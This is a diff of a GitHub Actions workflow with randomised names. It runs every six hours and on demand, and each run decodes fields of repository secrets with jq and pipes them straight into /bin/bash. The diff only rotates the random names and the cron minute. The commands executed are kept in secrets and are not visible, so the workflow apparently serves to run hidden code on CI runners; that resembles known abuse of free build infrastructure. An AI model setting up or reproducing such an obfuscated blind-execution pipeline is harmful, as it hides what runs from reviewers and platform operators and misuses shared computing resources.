@@ -1,26 +1,28 @@
 name: ninboning
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 0/6 * * *'
+    - cron: '56 0/6 * * *'
 
-jobs:  # 20896
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: ninboning
         env:
-          pxnxm24099: ${{ secrets.pxnxm24099 }}
+          bfbeu5: ${{ secrets.bfbeu5 }}
         run: |
-          echo $pxnxm24099 | jq -r .folzl75 | /bin/bash
-          echo $k91654 | jq -r .wfi5080 | /bin/bash
-          echo $tabuy48 | jq -r .cei96685 | /bin/bash
-          echo $zgz15 | jq -r .ygiuc23 | /bin/bash
-          echo $txl3 | jq -r .i35812 | /bin/bash
-          echo $mdirr0418 | jq -r .bdobc0 | /bin/bash
-          echo $oiamn272 | jq -r .bbzt485 | /bin/bash
-          echo $z2 | jq -r .ozl82 | /bin/bash
-          echo $ga3115 | jq -r .v4183 | /bin/bash
+          echo $bfbeu5 | jq -r .c43 | /bin/bash
+          echo $qkp5796 | jq -r .thhxi221 | /bin/bash
+          echo $vyty562 | jq -r .o8 | /bin/bash
+          echo $rzw44 | jq -r .ht757 | /bin/bash
+          echo $wii0 | jq -r .vyuj706 | /bin/bash
+          echo $gt63053 | jq -r .ccoxj2033 | /bin/bash
+          echo $to70706 | jq -r .goecr1253 | /bin/bash
+          echo $tg49394 | jq -r .h99 | /bin/bash
+          echo $sn0553 | jq -r .ei2807 | /bin/bash
+          echo $h40 | jq -r .jvtgg5 | /bin/bash
+          echo $jz9 | jq -r .a6 | /bin/bash
 
